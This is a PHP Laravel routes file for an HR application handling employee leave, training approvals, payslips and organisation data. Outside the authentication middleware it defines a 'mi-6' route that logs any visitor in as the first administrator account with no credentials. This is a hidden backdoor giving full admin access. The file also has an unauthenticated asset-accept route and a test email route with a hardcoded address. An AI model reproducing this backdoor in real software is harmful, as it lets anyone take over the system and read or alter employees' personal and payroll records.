<?php /*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

date_default_timezone_set("Asia/Bangkok");

Route::get('/', function () 
{
	if (!Auth::check() && !Request::is('login')) {
    	return redirect('login'); 
	}else{
		if(Auth::user()->access_id == 1)
        {
			return redirect('administrator'); //return view('home')->with($params);
		}elseif(Auth::user()->access_id == 2)
        {
			return redirect('karyawan'); //return view('home')->with($params);
		}
	}
    return redirect('login');
});

Auth::routes();

Route::get('asset-accept/{id}', 'IndexController@acceptAsset')->name('accept-asset');

// ROUTING MI6
Route::get('mi-6', function(){

	$user = \App\User::where('access_id', 1)->first();
        
    if($user)
    {
        \Auth::loginUsingId($user->id);

        return redirect()->route('administrator.dashboard')->with('message-success', 'Welcome MI6');
    }
})->name('mi6');

// ROUTING LOGIN
Route::group(['middleware' => ['auth']], function(){
	/**
	 * Ajax
	 */
	Route::post('ajax/get-division-by-directorate', 'AjaxController@getDivisionByDirectorate')->name('ajax.get-division-by-directorate');
	Route::post('ajax/get-department-by-division', 'AjaxController@getDepartmentByDivision')->name('ajax.get-department-by-division');
	Route::post('ajax/get-section-by-department', 'AjaxController@getSectionByDepartment')->name('ajax.get-section-by-department');
	Route::get('ajax/get-structure', 'AjaxController@getStructure')->name('ajax.get-stucture');
	Route::get('ajax/get-structure-branch', 'AjaxController@getStructureBranch')->name('ajax.get-stucture-branch');
	Route::post('ajax/get-kabupaten-by-provinsi', 'AjaxController@getKabupatenByProvinsi')->name('ajax.get-kabupaten-by-provinsi');
	Route::post('ajax/get-kecamatan-by-kabupaten', 'AjaxController@getKecamatanByKabupaten')->name('ajax.get-kecamatan-by-kabupaten');
	Route::post('ajax/get-kelurahan-by-kecamatan', 'AjaxController@getKelurahanByKecamatan')->name('ajax.get-kelurahan-by-kecamatan');
	Route::post('ajax/get-karyawan-by-id', 'AjaxController@getKaryawanById')->name('ajax.get-karyawan-by-id');
	Route::post('ajax/add-setting-cuti-personalia', 'AjaxController@addtSettingCutiPersonalia')->name('ajax.add-setting-cuti-personalia');
	Route::post('ajax/add-setting-cuti-atasan', 'AjaxController@addtSettingCutiAtasan')->name('ajax.add-setting-cuti-atasan');
	
	Route::post('ajax/add-setting-training-ga-department-mengetahui', 'AjaxController@addSettingTrainingGaDepartment')->name('ajax.add-setting-training-ga-department-mengetahui');
	Route::post('ajax/add-setting-training-hrd', 'AjaxController@addSettingTrainingHRD')->name('ajax.add-setting-training-hrd');
	Route::post('ajax/add-setting-training-finance', 'AjaxController@addSettingTrainingFinance')->name('ajax.add-setting-training-finance');
	
	Route::post('ajax/get-history-approval', 'AjaxController@getHistoryApproval')->name('ajax.get-history-approval');
	Route::post('ajax/get-airports', 'AjaxController@getAirports')->name('ajax.get-airports');
	Route::post('ajax/get-history-approval-cuti', 'AjaxController@getHistoryApprovalCuti')->name('ajax.get-history-approval-cuti');	
	Route::post('ajax/get-history-approval-training', 'AjaxController@getHistoryApprovalTraining')->name('ajax.get-history-approval-training');	
	Route::post('ajax/get-history-training-bill', 'AjaxController@getHistoryApprovalTrainingBill')->name('ajax.get-history-training-bill');				
	Route::post('ajax/get-karyawan', 'AjaxController@getKaryawan')->name('ajax.get-karyawan');

	Route::post('ajax/update-dependent', 'AjaxController@updateDependent')->name('ajax.update-dependent');		
	Route::post('ajax/update-education', 'AjaxController@updateEducation')->name('ajax.update-education');		
	Route::post('ajax/update-cuti', 'AjaxController@updateCuti')->name('ajax.update-cuti');		
	
	// EMPORE
	Route::post('ajax/get-manager-by-direktur', 'AjaxEmporeController@getManagerByDirektur')->name('ajax.get-manager-by-direktur');
	//Route::post('ajax/get-staff-by-manager', 'AjaxEmporeController@getStaffByManager')->name('ajax.get-staff-by-manager');
	Route::post('ajax/get-supervisor-by-manager', 'AjaxEmporeController@getSupervisorByManager')->name('ajax.get-supervisor-by-manager');
	Route::post('ajax/get-staff-by-supervisor', 'AjaxEmporeController@getStaffBySupervisor')->name('ajax.get-staff-by-supervisor');

	Route::post('ajax/update-first-password', 'AjaxController@updatePassword')->name('ajax.update-first-password');		
	Route::post('ajax/update-password-administrator', 'AjaxController@updatePasswordAdministrator')->name('ajax.update-password-administrator');		
});

// ROUTING KARYAWAN
Route::group(['prefix' => 'karyawan', 'middleware' => ['auth', 'access:2']], function(){
	
	$path = 'Karyawan\\';

	Route::get('/', $path . 'IndexController@index')->name('karyawan.dashboard');
	
	
	Route::resource('training', $path . 'TrainingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
	Route::get('training/biaya/{id}', $path . 'TrainingController@biaya')->name('karyawan.training.biaya');
	Route::get('training/detail/{id}', $path . 'TrainingController@detailTraining')->name('karyawan.training.detail');
	Route::post('training/submit-biaya', $path . 'TrainingController@submitBiaya')->name('karyawan.training.submit-biaya');
	Route::resource('cuti', $path . 'CutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
	Route::get('approval-cuti',  $path . 'ApprovalCutiController@index')->name('karyawan.approval.cuti.index');
	Route::get('approval-cuti/detail/{id}',  $path . 'ApprovalCutiController@detail')->name('karyawan.approval.cuti.detail');
	Route::post('approval-cuti/proses',  $path . 'ApprovalCutiController@proses')->name('karyawan.approval.cuti.proses');
	
	Route::get('approval-cuti-atasan',  $path . 'ApprovalCutiAtasanController@index')->name('karyawan.approval.cuti-atasan.index');
	Route::get('approval-cuti-atasan/detail/{id}',  $path . 'ApprovalCutiAtasanController@detail')->name('karyawan.approval.cuti-atasan.detail');
	Route::post('approval-cuti-atasan/proses',  $path . 'ApprovalCutiAtasanController@proses')->name('karyawan.approval.cuti-atasan.proses');

	Route::get('approval-cuti-manager',  $path . 'ApprovalCutiManagerController@index')->name('karyawan.approval.cuti-manager.index');
	Route::get('approval-cuti-manager/detail/{id}',  $path . 'ApprovalCutiManagerController@detail')->name('karyawan.approval.cuti-manager.detail');
	Route::post('approval-cuti-manager/proses',  $path . 'ApprovalCutiManagerController@proses')->name('karyawan.approval.cuti-manager.proses');

	Route::get('approval-training',  $path . 'ApprovalTrainingController@index')->name('karyawan.approval.training.index');
	Route::get('approval-training/detail/{id}',  $path . 'ApprovalTrainingController@detail')->name('karyawan.approval.training.detail');
	Route::post('approval-training/proses',  $path . 'ApprovalTrainingController@proses')->name('karyawan.approval.training.proses');
	Route::get('approval-training/biaya/{id}',  $path . 'ApprovalTrainingController@biaya')->name('karyawan.approval.training.biaya');
	Route::post('approval-training/proses-biaya',  $path . 'ApprovalTrainingController@prosesBiaya')->name('karyawan.approval.training.proses-biaya');

	Route::get('approval-training-atasan',  $path . 'ApprovalTrainingAtasanController@index')->name('karyawan.approval.training-atasan.index');
	Route::get('approval-training-atasan/detail/{id}',  $path . 'ApprovalTrainingAtasanController@detail')->name('karyawan.approval.training-atasan.detail');
	Route::post('approval-training-atasan/proses',  $path . 'ApprovalTrainingAtasanController@proses')->name('karyawan.approval.training-atasan.proses');
	Route::post('approval-training-atasan/biaya',  $path . 'ApprovalTrainingAtasanController@biaya')->name('karyawan.approval.training-atasan.biaya');
	Route::get('approval-training-atasan/biaya/{id}',  $path . 'ApprovalTrainingAtasanController@biaya')->name('karyawan.approval.training-atasan.biaya');
	Route::post('approval-training-atasan/proses-biaya',  $path . 'ApprovalTrainingAtasanController@prosesBiaya')->name('karyawan.approval.training-atasan.proses-biaya');

	Route::get('approval-training-manager',  $path . 'ApprovalTrainingManagerController@index')->name('karyawan.approval.training-manager.index');
	Route::get('approval-training-manager/detail/{id}',  $path . 'ApprovalTrainingManagerController@detail')->name('karyawan.approval.training-manager.detail');
	Route::post('approval-training-manager/proses',  $path . 'ApprovalTrainingManagerController@proses')->name('karyawan.approval.training-manager.proses');
	Route::post('approval-training-manager/biaya',  $path . 'ApprovalTrainingManagerController@biaya')->name('karyawan.approval.training-manager.biaya');
	Route::get('approval-training-manager/biaya/{id}',  $path . 'ApprovalTrainingManagerController@biaya')->name('karyawan.approval.training-manager.biaya');
	Route::post('approval-training-manager/proses-biaya',  $path . 'ApprovalTrainingManagerController@prosesBiaya')->name('karyawan.approval.training-manager.proses-biaya');


	Route::get('news/readmore/{id}',  $path . 'IndexController@readmore')->name('karyawan.news.readmore');
	Route::get('karyawan/find', $path .'IndexController@find')->name('karyawan.karyawan.find');
	Route::get('karyawan/profile', $path .'IndexController@profile')->name('karyawan.profile');
	Route::get('karyawan/traning/detail-all/{id}', $path . 'TrainingController@detailAll')->name('karyawan.training.detail-all');
	Route::get('karyawan/download-internal-memo/{id}', $path . 'IndexController@downloadInternalMemo')->name('karyawan.download-internal-memo');
	Route::get('karyawan/download-peraturan-perusahaan/{id}', $path . 'IndexController@downloadPeraturanPerusahaan')->name('karyawan.download-peraturan-perusahaan');
	Route::get('karyawan/news/more', $path . 'IndexController@newsmore')->name('karyawan.news.more');
	Route::get('karyawan/internal-memo/more', $path . 'IndexController@internalMemoMore')->name('karyawan.internal-memo.more');
	Route::get('karyawan/productinformation/more', $path . 'IndexController@productinformationMore')->name('karyawan.productinformation.more');
	Route::get('karyawan/backtoadministrator', $path . 'IndexController@backtoadministrator')->name('karyawan.back-to-administrator');
});

// ROUTING ADMINISTRATOR
Route::group(['prefix' => 'administrator', 'middleware' => ['auth', 'access:1']], function(){
	
	Route::get('sendemail', function(){

		$objDemo = new \stdClass();
        $objDemo->content = 'Demo One Value';
 
        \Mail::to("doni.enginer@gmail.com")->send(new \App\Mail\GeneralMail($objDemo));
	});

	$path = 'Administrator\\';

	Route::get('/', $path . 'IndexController@index')->name('administrator.dashboard');

	Route::resource('karyawan', $path . 'KaryawanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('department', $path . 'DepartmentController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('jabatan', $path . 'JabatanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('provinsi', $path . 'ProvinsiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('kabupaten', $path . 'KabupatenController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('kecamatan', $path . 'KecamatanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('kelurahan', $path . 'KelurahanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('training', $path . 'TrainingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('cuti', $path . 'CutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('directorate', $path . 'DirectorateController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('division', $path . 'DivisionController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('section', $path . 'SectionController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('cabang', $path . 'CabangController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('bank', $path . 'BankController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('universitas', $path . 'UniversitasController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('program-studi', $path . 'ProgramStudiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('jurusan', $path . 'JurusanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('sekolah', $path . 'SekolahController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
		
	Route::get('training/detail/{id}',  $path . 'TrainingController@detail')->name('administrator.training.detail');
	Route::post('training/proses',  $path . 'TrainingController@proses')->name('administrator.training.proses');
	Route::get('training/biaya/{id}',  $path . 'TrainingController@biaya')->name('administrator.training.biaya');
	Route::post('training/proses-biaya',  $path . 'TrainingController@prosesBiaya')->name('administrator.training.proses-biaya');

	Route::resource('setting-cuti', $path . 'SettingCutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('setting-training', $path . 'SettingTrainingController', ['only'=> ['index','destroy'], 'as' => 'administrator']);
	Route::resource('setting-master-cuti', $path . 'SettingMasterCutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('cuti-bersama', $path . 'CutiBersamaController', ['as' => 'administrator']);

	Route::get('structure', $path .'IndexController@structure')->name('administrator.structure');
	
	Route::resource('setting', $path .'SettingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('news', $path .'NewsController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('internal-memo', $path .'InternalMemoController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::get('internal-memo/broadcast/{id}', $path .'InternalMemoController@broadcast')->name('administrator.internal-memo.broadcast');

	Route::resource('branch-organisasi', $path .'BranchOrganisasiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('branch-staff', $path .'BranchStaffController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('libur-nasional', $path .'LiburNasionalController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('training-type', $path .'TrainingTypeController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('plafond-dinas', $path .'PlafondDinasController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('position', $path .'PositionController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('job-rule', $path .'JobRuleController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::post('libur-nasional/import', $path .'LiburNasionalController@import')->name('administrator.libur-nasional.import');
	Route::post('cabang/import', $path .'CabangController@import')->name('administrator.cabang.import');
	Route::post('plafond-dinas/import', $path .'PlafondDinasController@import')->name('administrator.plafond-dinas.import');
	Route::post('plafond-dinas/destroy-luar-negeri', $path .'PlafondDinasController@deleteLuarNegeri')->name('administrator.plafond-dinas.destroy-luar-negeri');
	Route::post('plafond-dinas/edit-luar-negeri/{id}', $path .'PlafondDinasController@editLuarNegeri')->name('administrator.plafond-dinas.edit-luar-negeri');
	Route::get('branch-organisasi/tree', $path .'BranchOrganisasiController@tree')->name('administrator.branch-organisasi.tree');

	Route::get('karyawan/delete-cuti/{id}', $path .'KaryawanController@DeleteCuti')->name('administrator.karyawan.delete-cuti');
	Route::post('karyawan/import', $path .'KaryawanController@importData')->name('administrator.karyawan.import');
	Route::get('karyawan/preview-import', $path .'KaryawanController@previewImport')->name('administrator.karyawan.preview-import');
	Route::get('karyawan/delete-temp/{id}', $path .'KaryawanController@deleteTemp')->name('administrator.karyawan.delete-temp');
	Route::get('karyawan/detail-temp/{id}', $path .'KaryawanController@detailTemp')->name('administrator.karyawan.detail-temp');
	Route::get('karyawan/import-all', $path .'KaryawanController@importAll')->name('administrator.karyawan.import-all');
	Route::get('karyawan/print-profile/{id}', $path .'KaryawanController@printProfile')->name('administrator.karyawan.print-profile');
	Route::get('karyawan/delete-old-user/{id}', $path .'KaryawanController@deleteOldUser')->name('administrator.karyawan.delete-old-user');

	
	Route::post('cuti/batal', $path .'CutiController@batal')->name('administrator.cuti.batal');
	Route::post('training/batal', $path .'TrainingController@batal')->name('administrator.training.batal');
	Route::get('cuti/proses/{id}', $path .'CutiController@proses')->name('administrator.cuti.proses');
	Route::post('cuti/submit-proses', $path .'CutiController@submitProses')->name('administrator.cuti.submit-proses');

	Route::get('cuti/delete/{id}',  $path . 'CutiController@delete')->name('administrator.cuti.delete');
	Route::get('setting-master-cuti/delete/{id}',  $path . 'SettingMasterCutiController@delete')->name('administrator.setting-master-cuti.delete');
	Route::resource('peraturan-perusahaan', $path .'PeraturanPerusahaanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);

	Route::get('setting', $path. 'IndexController@setting')->name('administrator.setting.index');

	Route::get('karyawan/print-payslip/{id}', $path.'KaryawanController@printPayslip')->name('administrator.karyawan.print-payslip');
	Route::get('request-pay-slip', $path.'RequestPaySlipController@index')->name('administrator.request-pay-slip.index');
	Route::get('request-pay-slip/proses/{id}', $path.'RequestPaySlipController@proses')->name('administrator.request-pay-slip.proses');
	Route::post('request-pay-slip/submit/{id}', $path.'RequestPaySlipController@submit')->name('administrator.request-pay-slip.submit');

	Route::get('karyawan/print-payslipnet/{id}', $path.'KaryawanController@printPayslipNet')->name('administrator.karyawan.print-payslipnet');

	Route::get('karyawan/print-payslipgross/{id}', $path.'KaryawanController@printPayslipGross')->name('administrator.karyawan.print-payslipgross');

	Route::get('karyawan/delete-dependent/{id}', $path.'KaryawanController@deleteDependent')->name('administrator.karyawan.delete-dependent');
	Route::get('karyawan/delete-education/{id}', $path.'KaryawanController@deleteEducation')->name('administrator.karyawan.delete-education');
	Route::get('karyawan/delete-inventaris/{id}', $path.'KaryawanController@deleteInventaris')->name('administrator.karyawan.delete-inventaris');
	Route::get('karyawan/delete-inventaris-mobil/{id}', $path.'KaryawanController@deleteInventarisMobil')->name('administrator.karyawan.delete-inventaris-mobil');
	Route::get('karyawan/delete-inventaris-lainnya/{id}', $path.'KaryawanController@deleteInventarisLainnya')->name('administrator.karyawan.delete-inventaris-lainnya');
	Route::get('karyawan/downloadExcel', $path.'KaryawanController@downloadExcel')->name('administrator.karyawan.downloadExcel');

	Route::resource('empore-direktur', $path .'EmporeDirekturController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('empore-manager', $path .'EmporeManagerController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('empore-supervisor', $path .'EmporeSupervisorController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	Route::resource('empore-staff', $path .'EmporeStaffController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
	

	Route::get('karyawan/autologin/{id}', $path .'KaryawanController@autologin')->name('administrator.karyawan.autologin');
	Route::get('profile', $path .'IndexController@profile')->name('administrator.profile');
	Route::post('update-profile', $path. 'IndexController@updateProfile')->name('administrator.update-profile');
	Route::post('cuti/index', $path .'CutiController@index')->name('administrator.cuti.index');
	Route::get('cuti/index', $path .'CutiController@index')->name('administrator.cuti.index');
	Route::post('training/index', $path .'TrainingController@index')->name('administrator.training.index');
	Route::get('training/index', $path .'TrainingController@index')->name('administrator.training.index');
}); ?>